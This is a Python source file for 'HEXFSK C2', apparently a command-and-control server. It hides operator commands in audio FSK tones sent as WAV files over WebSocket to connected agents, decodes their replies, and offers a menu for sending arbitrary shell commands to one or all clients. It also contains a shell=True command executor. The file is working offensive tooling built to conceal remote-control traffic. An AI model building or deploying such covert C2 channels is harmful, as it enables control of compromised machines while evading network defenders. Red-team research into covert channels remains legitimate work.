# server.py

import numpy as np
from scipy.io import wavfile
import asyncio
import websockets
import sys
import io
import argparse
from colorama import init as colorama_init, Fore, Style
from pyfiglet import Figlet
import math

# Initialize colorama
colorama_init(autoreset=True)

def startscreen():
    image = """
          
                                   :.           ::.         
                                  :^~.         :^~^.^.      
                 .^^:             ....         :...~~:      
     ..          .^:.             ~  ~    .  .~::.^~        
    .^~^          .. ^:   ..  ...7J^.!7   . .7^ !^7.        
  .^^^:...   ..   ^! .77:.     .75PGG~~?^:.:!:  ~..         
  .^^~..:!~^. .  .?~   .~!^:.:~J5PGGGP..~!!:..  ~~          
     .~~~?5!~:..:!?      .YPPPPGGGGGGG^    .YP.^5.          
       ::^J5..^~!7:.      YGGPPP55YJ?7:    ... .~:          
         ~!GP.  !P5Y!. ::::~!!!777?~~.  . .7J~.^:           
          ^PG7  ...:^~:.   7GGGYYGJ!7^.:::  ...:^^.         
          .~:.: .YPGG?..  .~?~:..:...         .  .:         
            :!5. .::.     .            ..    ..  .^^        
          ..^^:. .^?Y55PJ7~~^.....:^~75PP5Y?:. .. .~^       
        ~5Y^.  ..~5?!!!7Y5B#&P7G7P#&#PY7!~!J5^.:. :!Y5~     
       ^G7..:. 7!.    .:..:~7Y77!Y?~. .:.   .:7!  :..7G:    
       :P! .^ .G^~JY!:.?:  .........  ^?.:7YJ^!P. ^. 75.    
        7? ...J#::JBG57!~!?YPP?.7G5Y7!~!75BPJ:^&?... ?!     
        .^!. .BJ....:^^^PG7:!PG~PP!^?PG^^^:....5B. :!^.     
       .::.  ^5P!..  .~7YY::.:7J7:.::Y5!.   ..?P5:  .::.    
       :~:   .7BG: .:~55~7BG7:~7~:7GB?!P7... ^BB!.   :~:    
      .:7:  . .YB~.~.!YP55B###&&&&&&P?YYJ.:^:?BJ. .  :7:.   
      .7J. .^. .~!J?5P5BGBGBPP5BGBB#B#G5Y. ^?P~  .^. .Y!    
      .~~: ..   :P5YJ?7!~^~~!JPPBGP5JBBGG! .7~   ... :~~.   
      ::7:   .. 7GGGPB&&&#BPY!^^!?PBPPPYYY~.!   ..   :7:.   
       .Y7^!^ . ^!GGGPB&@@@@@@&#G5?77JY5Y77^! ... ^!^?Y.    
        !P!?:^. ^.~PGGGG#&&&&@@@&&B#BP5555^^~.  :^^?~P~     
         :~~^P:..:..75PPGGGGBBBGPPGGGGGP7..7 .  ^P^~~:      
          .:~P: . :.  :^!7JY555555YJ?~:. .^ ..  ^5^:.       
           ..^~... .:.     ....        ......  :~^..        
              .!. .^ .....         ..... .:.  .!.           
                . .   HEXFSK C2 by D8RH8R :  . .             
                  ..  ^~:..       .. :..: ...               
                      ....^~^!~.^:~?^:...                   
                           .^^J!::..                        
                            ..:                             
          """
    print(Fore.WHITE + image)

# ASCII Art Banner using pyfiglet
def print_banner():
    f = Figlet(font='small')
    banner = f.renderText('HEXFSK C2')
    print(Fore.CYAN + banner)

# HEX-FSK Mapping for Map A (Server to Agent)
FREQ_MAP_A = {
    '0': 1000, '1': 1100, '2': 1200, '3': 1300,
    '4': 1400, '5': 1500, '6': 1600, '7': 1700,
    '8': 1800, '9': 1900, 'A': 2000, 'B': 2100,
    'C': 2200, 'D': 2300, 'E': 2400, 'F': 2500
}

# HEX-FSK Mapping for Map B (Agent to Server)
FREQ_MAP_B = {
    '0': 1050, '1': 1150, '2': 1250, '3': 1350,
    '4': 1450, '5': 1550, '6': 1650, '7': 1750,
    '8': 1850, '9': 1950, 'A': 2050, 'B': 2150,
    'C': 2250, 'D': 2350, 'E': 2450, 'F': 2550
}

# Packet structure specs
PREAMBLE = "AAAAAA"  # 3 bytes, represented as 6 hex characters
END_BIT = "0F"        # 1 byte, represented as 2 hex characters

# Maximum payload size per frame (in characters)
MAX_PAYLOAD_PER_FRAME = 500  # Adjust based on requirements

# Global Debug Flag
DEBUG = False

def log_debug(message):
    if DEBUG:
        print(Fore.CYAN + f"[DEBUG] {message}" + Style.RESET_ALL)

def log_info(message):
    print(Fore.GREEN + f"[INFO] {message}" + Style.RESET_ALL)

def log_error(message):
    print(Fore.RED + f"[ERROR] {message}" + Style.RESET_ALL)

def plaintext_to_hex(plaintext):
    """Convert plaintext to hexadecimal string."""
    return plaintext.encode('utf-8').hex().upper()

def hex_to_plaintext(hex_string):
    """Convert hexadecimal string back to plaintext."""
    return bytes.fromhex(hex_string).decode('utf-8')

def encode_with_frequency_map(hex_string, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Encode a hex string using a specific frequency map into an FSK signal."""
    signal = np.array([], dtype=np.float32)
    for char in hex_string:
        frequency = freq_map.get(char)
        if not frequency:
            log_debug(f"Invalid character in hex string: {char}")
            continue
        t = np.linspace(0, symbol_duration, int(sampling_rate * symbol_duration), endpoint=False)
        tone = np.sin(2 * np.pi * frequency * t).astype(np.float32)
        signal = np.concatenate([signal, tone])
    return signal

def decode_with_frequency_map(signal, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Decode an FSK signal using a specific frequency map into a hex string."""
    n_samples = int(sampling_rate * symbol_duration)
    reversed_freq_map = {v: k for k, v in freq_map.items()}  # Frequency to Hex mapping
    decoded_hex = ""
    for i in range(0, len(signal), n_samples):
        chunk = signal[i:i + n_samples]
        if len(chunk) < n_samples:
            log_debug(f"Incomplete chunk detected. Expected {n_samples} samples, got {len(chunk)}.")
            continue
        fft_spectrum = np.fft.fft(chunk)
        freqs = np.fft.fftfreq(len(chunk), 1 / sampling_rate)
        positive_freqs = freqs[:len(freqs)//2]
        magnitudes = np.abs(fft_spectrum[:len(freqs)//2])
        dominant_freq = positive_freqs[np.argmax(magnitudes)]
        # Find the closest frequency in the map
        closest_freq = min(freq_map.values(), key=lambda f: abs(f - dominant_freq))
        hex_char = reversed_freq_map.get(closest_freq)
        if hex_char:
            decoded_hex += hex_char
            log_debug(f"Dominant Frequency: {dominant_freq} Hz, Mapped to: {hex_char}")
        else:
            log_debug(f"No mapping found for frequency: {dominant_freq} Hz")
    return decoded_hex

def encode_packet(plaintext, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Encode plaintext into a full FSK packet and return WAV data."""
    hex_payload = plaintext_to_hex(plaintext)
    # Construct packet: PREAMBLE + HEX_PAYLOAD + END_BIT
    packet_hex = f"{PREAMBLE}{hex_payload}{END_BIT}"
    log_debug(f"Constructed Packet (Hex): {packet_hex}")
    # Encode packet as FSK signal
    fsk_signal = encode_with_frequency_map(packet_hex, freq_map, symbol_duration, sampling_rate)
    # Save FSK signal to an in-memory WAV file
    with io.BytesIO() as wav_buffer:
        wavfile.write(wav_buffer, sampling_rate, fsk_signal)
        wav_data = wav_buffer.getvalue()
    return wav_data

def decode_packet(wav_data, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Decode a WAV file containing an FSK signal into plaintext."""
    # Read WAV data from bytes
    with io.BytesIO(wav_buffer_io := wav_data) as wav_buffer_io:
        try:
            sr, signal = wavfile.read(wav_buffer_io)
        except Exception as e:
            raise ValueError(f"Failed to read WAV data: {e}")

    if sr != sampling_rate:
        raise ValueError(f"Sampling rate mismatch: Expected {sampling_rate}, got {sr}")

    # Ensure signal is mono
    if len(signal.shape) > 1:
        signal = signal[:,0]

    log_debug(f"Read WAV data: {len(signal)} samples at {sr} Hz")

    # Decode the packet
    decoded_hex = decode_with_frequency_map(signal, freq_map, symbol_duration, sampling_rate)

    # Debug: Print decoded hex
    log_debug(f"Decoded Hex: {decoded_hex}")

    # Extract packet components
    if len(decoded_hex) < len(PREAMBLE) + len(END_BIT):
        raise ValueError("Packet too short.")

    preamble = decoded_hex[:len(PREAMBLE)]
    hex_payload = decoded_hex[len(PREAMBLE):-len(END_BIT)]
    end_bit = decoded_hex[-len(END_BIT):]

    # Verify preamble and end bit
    if preamble != PREAMBLE:
        raise ValueError("Invalid preamble.")
    if end_bit != END_BIT:
        raise ValueError("Invalid end bit.")

    # Convert hex payload to plaintext
    plaintext = hex_to_plaintext(hex_payload)
    log_debug(f"Decoded Packet: Payload Hex -> {hex_payload}, Plaintext -> {plaintext}")
    return plaintext

def split_into_frames(data, max_payload):
    """Split data into frames with a maximum payload size."""
    total_length = len(data)
    total_frames = math.ceil(total_length / max_payload)
    frames = []
    for i in range(total_frames):
        start = i * max_payload
        end = start + max_payload
        frame_data = data[start:end]
        frames.append((i + 1, total_frames, frame_data))
    return frames

def reconstruct_data(frames):
    """Reconstruct data from frames sorted by sequence number."""
    # Sort frames based on sequence number
    frames_sorted = sorted(frames, key=lambda x: x[0])
    data = ''.join([frame[1] for frame in frames_sorted])  # Correct index
    return data

class Server:
    def __init__(self, host='192.168.1.102', port=8765, freq_map=FREQ_MAP_A, sampling_rate=22050):
        self.host = host
        self.port = port
        self.freq_map = freq_map
        self.sampling_rate = sampling_rate
        self.clients = {}  # client_id: websocket
        self.client_id_counter = 1  # Unique client IDs
        self.received_frames = {}  # client_id: {message_id: [frames]}

    async def handler(self, websocket, path=None):
        # Assign a unique ID to the new client
        client_id = self.client_id_counter
        self.client_id_counter += 1
        self.clients[client_id] = websocket
        client_address = websocket.remote_address
        log_info(f"Client {client_id} connected from {client_address}")

        # Initialize received_frames entry for this client
        self.received_frames[client_id] = {}

        try:
            async for message in websocket:
                if isinstance(message, bytes):
                    log_debug(f"Received binary message from Client {client_id}: {len(message)} bytes")
                    try:
                        # Decode the WAV file into plaintext response using Map B
                        response = decode_packet(message, FREQ_MAP_B, sampling_rate=self.sampling_rate)
                        log_debug(f"Received Response from Client {client_id}: {response}")

                        # Check if the response is a frame
                        if response.startswith("FRAME"):
                            # Expected frame format: FRAME:<message_id>:<sequence>:<total_frames>:<data>
                            parts = response.split(':', 4)
                            if len(parts) != 5:
                                log_error(f"Invalid frame format from Client {client_id}: {response}")
                                continue
                            _, message_id, sequence, total, frame_data = parts
                            if message_id not in self.received_frames[client_id]:
                                self.received_frames[client_id][message_id] = []
                            self.received_frames[client_id][message_id].append((int(sequence), frame_data))
                            log_debug(f"Received Frame {sequence}/{total} for Message ID {message_id} from Client {client_id}")

                            # Check if all frames are received
                            if len(self.received_frames[client_id][message_id]) == int(total):
                                # Reconstruct the complete message
                                frames = self.received_frames[client_id][message_id]
                                complete_data = reconstruct_data(frames)
                                log_debug(f"Reconstructed Hex Data: {complete_data}")

                                try:
                                    # Convert hex data to plaintext
                                    plaintext_response = hex_to_plaintext(complete_data)
                                    log_info(f"Complete message from Client {client_id}: {plaintext_response}")
                                except ValueError as ve:
                                    log_error(f"Failed to decode hex payload from Client {client_id}: {ve}")
                                    continue

                                # Remove the stored frames
                                del self.received_frames[client_id][message_id]
                        else:
                            # Handle non-framed responses if any
                            log_info(f"Received Response from Client {client_id}: {response}")
                    except Exception as e:
                        error_message = f"ERROR: {str(e)}"
                        log_error(f"Error processing message from Client {client_id}: {error_message}")
                elif isinstance(message, str):
                    log_debug(f"Received unexpected text message from Client {client_id}: {message}")
                    continue
        except websockets.exceptions.ConnectionClosed as e:
            log_info(f"Client {client_id} disconnected: {e}")
        finally:
            # Remove client from the list
            if client_id in self.clients:
                del self.clients[client_id]
                del self.received_frames[client_id]
                log_debug(f"Client {client_id} removed from active clients.")

    def execute_command(self, command):
        """Execute a shell command and return its output."""
        import subprocess

        try:
            # WARNING: Executing shell commands can be dangerous.
            # Ensure that commands are sanitized and trusted in a real-world application.
            result = subprocess.run(command, shell=True, capture_output=True, text=True, executable='/bin/bash', timeout=30)
            output = result.stdout + result.stderr
            return output.strip() if output else "Command executed with no output."
        except subprocess.TimeoutExpired:
            return "Command execution timed out."
        except Exception as e:
            return f"Command execution failed: {str(e)}"

    async def send_command(self, command, websocket, client_id):
        """Encode and send a command to a specific client, splitting into frames if necessary."""
        try:
            # Convert command to hex
            hex_command = plaintext_to_hex(command)
            # Split into frames
            frames = split_into_frames(hex_command, MAX_PAYLOAD_PER_FRAME)
            message_id = f"{client_id}-{int(asyncio.get_event_loop().time())}"
            log_debug(f"Sending {len(frames)} frames for Message ID {message_id} to Client {client_id}")
            for frame_number, total_frames, frame_data in frames:
                # Frame format: FRAME:<message_id>:<sequence_number>:<total_frames>:<data>
                frame_message = f"FRAME:{message_id}:{frame_number}:{total_frames}:{frame_data}"
                wav_data = encode_packet(frame_message, self.freq_map, sampling_rate=self.sampling_rate)
                await websocket.send(wav_data)
                log_debug(f"Sent Frame {frame_number}/{total_frames} for Message ID {message_id} to Client {client_id}")
            log_info(f"Sent command to Client {client_id}: {command}")
        except Exception as e:
            log_error(f"Failed to send command to Client {client_id}: {e}")

    async def send_command_to_all(self, command):
        """Send a command to all connected clients."""
        if not self.clients:
            log_info("No connected clients to send commands.")
            return
        log_info(f"Broadcasting command to all {len(self.clients)} clients: {command}")
        for client_id, websocket in self.clients.items():
            await self.send_command(command, websocket, client_id)

    async def interactive_console(self):
        """Interactive menu to manage clients and send commands."""
        while True:
            print("\n=== Server Menu ===")
            print("1. List Connected Clients")
            print("2. Send Command to a Specific Client")
            print("3. Send Command to All Clients")
            print("4. Exit")
            print("Enter choice: ", end='', flush=True)
            choice = await asyncio.get_event_loop().run_in_executor(None, sys.stdin.readline)
            choice = choice.strip()

            if choice == '1':
                await self.list_clients()
            elif choice == '2':
                await self.send_command_to_client()
            elif choice == '3':
                await self.send_command_to_all_clients()
            elif choice == '4':
                log_info("Shutting down server.")
                for client_id, ws in list(self.clients.items()):
                    await ws.close()
                    log_info(f"Closed connection with Client {client_id}.")
                break
            else:
                log_info("Invalid choice. Please select a valid option.")

    async def list_clients(self):
        """List all connected clients."""
        if not self.clients:
            log_info("No clients are currently connected.")
            return
        print("\n=== Connected Clients ===")
        for client_id, websocket in self.clients.items():
            address = websocket.remote_address
            print(f"Client ID: {client_id}, Address: {address}")
        print("=========================\n")

    async def send_command_to_client(self):
        """Prompt user to select a client and send a command."""
        if not self.clients:
            log_info("No clients are currently connected.")
            return
        await self.list_clients()
        try:
            client_id_input = await asyncio.get_event_loop().run_in_executor(None, lambda: input("Enter Client ID to send command: "))
            client_id = int(client_id_input.strip())
            if client_id not in self.clients:
                log_info(f"Client ID {client_id} does not exist.")
                return
            command = await asyncio.get_event_loop().run_in_executor(None, lambda: input("Enter command to send: "))
            await self.send_command(command.strip(), self.clients[client_id], client_id)
        except ValueError:
            log_info("Invalid Client ID. Please enter a numeric value.")
        except Exception as e:
            log_error(f"Failed to send command: {e}")

    async def send_command_to_all_clients(self):
        """Prompt user to enter a command and send it to all clients."""
        if not self.clients:
            log_info("No clients are currently connected.")
            return
        command = await asyncio.get_event_loop().run_in_executor(None, lambda: input("Enter command to broadcast to all clients: "))
        await self.send_command_to_all(command.strip())

    async def start(self):
        """Start the WebSocket server and the interactive console."""
        server = await websockets.serve(
            self.handler,
            self.host,
            self.port,
            max_size=10**8,  # ~10 MB
            max_queue=None    # Remove max_queue limit if needed
        )
        log_info(f"WebSocket server started on ws://{self.host}:{self.port}")
        # Run the interactive console in a separate task
        console_task = asyncio.create_task(self.interactive_console())
        await console_task  # Wait until the console task completes

def parse_arguments():
    parser = argparse.ArgumentParser(description="WebSocket Server with Debugging and Enhanced UI")
    parser.add_argument('--debug', action='store_true', help="Enable debug mode for verbose logging")
    return parser.parse_args()

if __name__ == "__main__":
    # Print Banner
    startscreen()
    print_banner()

    # Parse command-line arguments
    args = parse_arguments()
    DEBUG = args.debug

    server = Server()
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        log_info("WebSocket server stopped manually.")
    except Exception as e:
        log_error(f"Server encountered an error: {e}")
